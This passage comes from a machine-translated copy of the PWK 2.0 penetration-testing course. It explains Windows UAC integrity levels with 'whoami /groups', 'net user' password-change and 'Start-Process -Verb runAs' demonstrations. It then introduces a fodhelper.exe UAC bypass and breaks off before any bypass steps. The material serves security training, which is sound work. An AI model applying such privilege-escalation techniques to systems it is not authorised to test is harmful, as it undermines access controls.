<div style="position:absolute;top:117709;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:117709;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">540</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:116728;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示同意提示。</font><font style="vertical-align: inherit;">在这种情况下，用户只需确认任务应该</font></font></nobr></div>
<div style="position:absolute;top:116747;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">完成并且不需要重新输入用户凭据。</font></font></nobr></div>
<div style="position:absolute;top:116780;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，在下图中，Windows 命令处理器运行在</font></font></nobr></div>
<div style="position:absolute;top:116799;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标准用户帐户正在尝试执行特权操作。</font><font style="vertical-align: inherit;">UAC根据其行事</font></font></nobr></div>
<div style="position:absolute;top:116819;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通知设置</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">504</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（</font><font style="vertical-align: inherit;">在这种情况下为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">始终通知</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">），暂停目标进程</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cmd.exe</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font></nobr></div>
<div style="position:absolute;top:116838;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">提示输入管理员用户名和密码以执行请求的特权操作。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:117298;left:291"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 275：UAC 对话框要求输入管理密码</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:117329;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">即使以管理用户身份登录，该帐户也会有两个安全令牌，一个</font></font></nobr></div>
<div style="position:absolute;top:117348;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以中等完整性级别运行，另一个以高完整性级别运行。</font><font style="vertical-align: inherit;">UAC 作为分离</font></font></nobr></div>
<div style="position:absolute;top:117368;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这两个完整性级别之间的机制。</font></font></nobr></div>
<div style="position:absolute;top:117401;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要查看操作中的完整性级别，让我们首先以管理员用户身份登录，打开命令提示符，然后</font></font></nobr></div>
<div style="position:absolute;top:117420;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">whoami /groups</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:117455;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">c:\Users\admin&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">whoami /groups</font></font></font></b></nobr></div>
<div style="position:absolute;top:117489;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">集团信息</font></font></nobr></div>
<div style="position:absolute;top:117506;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-----------------</font></font></nobr></div>
<div style="position:absolute;top:117540;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">组的名字    </font></font></nobr></div>
<div style="position:absolute;top:117540;left:433"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类型    </font></font></nobr></div>
<div style="position:absolute;top:117540;left:571"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标准识别码    </font></font></nobr></div>
<div style="position:absolute;top:117540;left:676"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">属性</font></font></nobr></div>
<div style="position:absolute;top:117557;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">================================================== ==================================</font></font></nobr></div>
<div style="position:absolute;top:117574;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">每个人    </font></font></nobr></div>
<div style="position:absolute;top:117574;left:433"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">知名组 S-1-1-0 必选组，</font></font></nobr></div>
<div style="position:absolute;top:117591;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NT AUTHORITY\Local account and member 知名组 S-1-5-114 用于d的组</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:117645;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">504 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2018 年），https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:117660;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帐户控制工程 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:117787;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="100"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 100 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:117820;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:118897;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:118897;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:118897;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">541</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:117916;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内置\管理员    </font></font></nobr></div>
<div style="position:absolute;top:117916;left:433"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">别名    </font></font></nobr></div>
<div style="position:absolute;top:117916;left:571"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">S-1-5-32-544 用于 d 的组</font></font></nobr></div>
<div style="position:absolute;top:117932;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内置\用户    </font></font></nobr></div>
<div style="position:absolute;top:117932;left:433"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">别名    </font></font></nobr></div>
<div style="position:absolute;top:117932;left:571"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">S-1-5-32-545 强制组，</font></font></nobr></div>
<div style="position:absolute;top:117949;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NT 权威\互动    </font></font></nobr></div>
<div style="position:absolute;top:117949;left:433"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">知名组 S-1-5-4 必选组，</font></font></nobr></div>
<div style="position:absolute;top:117966;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">控制台登录    </font></font></nobr></div>
<div style="position:absolute;top:117966;left:433"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">知名组 S-1-2-1 强制组，</font></font></nobr></div>
<div style="position:absolute;top:117984;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NT AUTHORITY\经过身份验证的用户    </font></font></nobr></div>
<div style="position:absolute;top:117984;left:433"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">知名组 S-1-5-11 必选组，</font></font></nobr></div>
<div style="position:absolute;top:118000;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NT AUTHORITY\本组织    </font></font></nobr></div>
<div style="position:absolute;top:118000;left:433"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">知名组 S-1-5-15 必选组，</font></font></nobr></div>
<div style="position:absolute;top:118017;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NT AUTHORITY\本地帐户    </font></font></nobr></div>
<div style="position:absolute;top:118017;left:433"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">知名组 S-1-5-113 强制组，</font></font></nobr></div>
<div style="position:absolute;top:118034;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当地的    </font></font></nobr></div>
<div style="position:absolute;top:118034;left:433"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">知名组 S-1-2-0 必选组，</font></font></nobr></div>
<div style="position:absolute;top:118051;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NT 权限\NTLM 身份验证    </font></font></nobr></div>
<div style="position:absolute;top:118051;left:433"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">知名组 S-1-5-64-10 必选组，</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:118068;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">强制标签\中等强制级别</font></font></b><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标签    </font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:118068;left:571"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">S-1-16-8192</font></font></nobr></div>
<div style="position:absolute;top:118088;left:324"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 555 - 检查组完整性级别</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:118117;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正如输出的最后一行所报告的那样，此命令提示符当前正在以 Medium 运行</font></font></nobr></div>
<div style="position:absolute;top:118136;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">完整性级别。</font></font></nobr></div>
<div style="position:absolute;top:118169;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们尝试从此命令提示符更改 admin 用户的密码：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:118204;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\admin&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">net user admin Ev!lpass</font></font></font></b></nobr></div>
<div style="position:absolute;top:118221;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">发生系统错误 5。</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:118255;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">访问被拒绝。</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:118274;left:319"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 556 - 尝试更改密码</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:118304;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">即使我们以管理用户身份登录，请求也被拒绝。</font></font></nobr></div>
<div style="position:absolute;top:118337;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了更改管理员用户的密码，我们必须切换到高完整性级别，即使我们</font></font></nobr></div>
<div style="position:absolute;top:118356;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用管理用户登录。</font><font style="vertical-align: inherit;">在我们的示例中，一种方法是通过</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:118376;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powershell.exe</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font></font><i><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Start-Process</font></font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 505 </font></font></font><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cmdlet 指定“以管理员身份运行”选项：</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:118411;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\admin&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powershell.exe Start-Process cmd.exe -Verb runAs</font></font></font></b></nobr></div>
<div style="position:absolute;top:118429;left:236"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 557 - 使用 powershell 生成具有高完整性的 cmd.exe 进程</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:118459;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">提交此命令并接受 UAC 提示后，我们会看到一个新的高</font></font></nobr></div>
<div style="position:absolute;top:118478;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">完整性</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cmd.exe</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进程。</font></font></nobr></div>
<div style="position:absolute;top:118511;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">whoami</font></font></font></b><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 506</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实用程序使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/groups</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参数</font><font style="vertical-align: inherit;">检查我们的完整性级别</font><font style="vertical-align: inherit;">并尝试</font></font></nobr></div>
<div style="position:absolute;top:118531;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">再次更改密码：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:118565;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Windows\system32&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">whoami /groups</font></font></font></b></nobr></div>
<div style="position:absolute;top:118582;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">集团信息</font></font></nobr></div>
<div style="position:absolute;top:118600;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-----------------</font></font></nobr></div>
<div style="position:absolute;top:118633;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">组的名字    </font></font></nobr></div>
<div style="position:absolute;top:118633;left:433"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类型    </font></font></nobr></div>
<div style="position:absolute;top:118633;left:571"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标准识别码    </font></font></nobr></div>
<div style="position:absolute;top:118633;left:676"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">属性</font></font></nobr></div>
<div style="position:absolute;top:118650;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">================================================== ==================================</font></font></nobr></div>
<div style="position:absolute;top:118667;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">每个人    </font></font></nobr></div>
<div style="position:absolute;top:118667;left:433"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">知名组 S-1-1-0 必选组，</font></font></nobr></div>
<div style="position:absolute;top:118684;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NT AUTHORITY\本地帐号和成员 知名群组 S-1-5-114 必选群组，</font></font></nobr></div>
<div style="position:absolute;top:118701;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内置\管理员    </font></font></nobr></div>
<div style="position:absolute;top:118701;left:433"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">别名    </font></font></nobr></div>
<div style="position:absolute;top:118701;left:571"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">S-1-5-32-544 强制组，</font></font></nobr></div>
<div style="position:absolute;top:118718;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内置\用户    </font></font></nobr></div>
<div style="position:absolute;top:118718;left:433"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">别名    </font></font></nobr></div>
<div style="position:absolute;top:118718;left:571"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">S-1-5-32-545 强制组，</font></font></nobr></div>
<div style="position:absolute;top:118735;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NT 权威\互动    </font></font></nobr></div>
<div style="position:absolute;top:118735;left:433"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">知名组 S-1-5-4 必选组，</font></font></nobr></div>
<div style="position:absolute;top:118752;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">控制台登录    </font></font></nobr></div>
<div style="position:absolute;top:118752;left:433"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">知名组 S-1-2-1 强制组，</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:118813;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">505 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2017 年），https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/start-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:118828;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进程？视图=powershell-6</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:118847;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">506 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2017 年），https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/whoami</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:118975;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="101"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 101 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:119008;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:120085;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:120085;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:120085;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">542</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:119104;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NT AUTHORITY\经过身份验证的用户    </font></font></nobr></div>
<div style="position:absolute;top:119104;left:433"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">知名组 S-1-5-11 必选组，</font></font></nobr></div>
<div style="position:absolute;top:119120;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NT AUTHORITY\本组织    </font></font></nobr></div>
<div style="position:absolute;top:119120;left:433"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">知名组 S-1-5-15 必选组，</font></font></nobr></div>
<div style="position:absolute;top:119137;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NT AUTHORITY\本地帐户    </font></font></nobr></div>
<div style="position:absolute;top:119137;left:433"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">知名组 S-1-5-113 强制组，</font></font></nobr></div>
<div style="position:absolute;top:119154;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当地的    </font></font></nobr></div>
<div style="position:absolute;top:119154;left:433"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">知名组 S-1-2-0 必选组，</font></font></nobr></div>
<div style="position:absolute;top:119172;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NT 权限\NTLM 身份验证    </font></font></nobr></div>
<div style="position:absolute;top:119172;left:433"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">知名组 S-1-5-64-10 必选组，</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:119188;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">强制标签\高强制级别</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:119188;left:433"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标签    </font></font></nobr></div>
<div style="position:absolute;top:119188;left:571"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">S-1-16-12288</font></font></nobr></div>
<div style="position:absolute;top:119222;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Windows\system32&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">net user admin Ev!lpass</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:119239;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令成功完成。</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:119259;left:141"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 558 - 在生成具有高完整性的 cmd.exe 后成功更改管理员用户的密码</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:119288;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这一次，我们以高完整性级别运行，密码更改成功。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:119323;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.2.3</font></font></i></nobr></div>
<div style="position:absolute;top:119323;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户帐户控制 (UAC) 绕过：fodhelper.exe 案例研究</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:119360;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以通过多种方式绕过 UAC。</font><font style="vertical-align: inherit;">在第一个示例中，我们将演示一种技术</font></font></nobr></div>
<div style="position:absolute;top:119380;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">允许管理员用户通过默默地将我们的完整性级别从中等提升到绕过 UAC</font></font></nobr></div>
<div style="position:absolute;top:119399;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">高的。</font></font></nobr></div>
<div style="position:absolute;top:119432;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">大多数公知的 UAC 绕过技术都针对特定的操作系统版本。</font><font style="vertical-align: inherit;">在</font></font></nobr></div>
<div style="position:absolute;top:119451;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这种情况下，目标是我们运行 Windows 10 build 1709 的实验室客户端。我们将利用一个有趣的</font></font></nobr></div>
<div style="position:absolute;top:119471;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基于 fodhelper.exe 的 UAC 绕过，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">507,508</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一个 Microsoft 支持应用程序负责</font></font></nobr></div>
<div style="position:absolute;top:119490;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">管理操作系统中的语言更改。</font><font style="vertical-align: inherit;">具体来说，这个应用程序启动</font></font></nobr></div>
<div style="position:absolute;top:119509;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">每当本地用户在“应用程序和功能”中选择“管理可选功能”选项时</font></font></nobr></div>
<div style="position:absolute;top:119529;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows 设置屏幕。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:120015;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">507 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Winscripting.blog，2017），https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/</font></font></font></nobr></div>
<div style="position:absolute;top:120035;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">508 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Pentestlab，2017），https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:120163;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="102"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 102 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:120196;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:121273;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:121273;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:121273;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">543</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:120718;left:347"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 276：管理可选功能</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:120749;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正如我们将很快展示的那样，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">fodhelper.exe</font></font></font></b><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 509</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">二进制文件</font><font style="vertical-align: inherit;">在 Windows 10 上</font><font style="vertical-align: inherit;">以</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">高完整性</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行</font></font></nobr></div>
<div style="position:absolute;top:120769;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1709. 由于 fodhelper 与</font></font></nobr></div>
<div style="position:absolute;top:120788;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows 注册表。</font><font style="vertical-align: inherit;">更具体地说，它与无需修改即可修改的注册表项进行交互。</font></font></nobr></div>
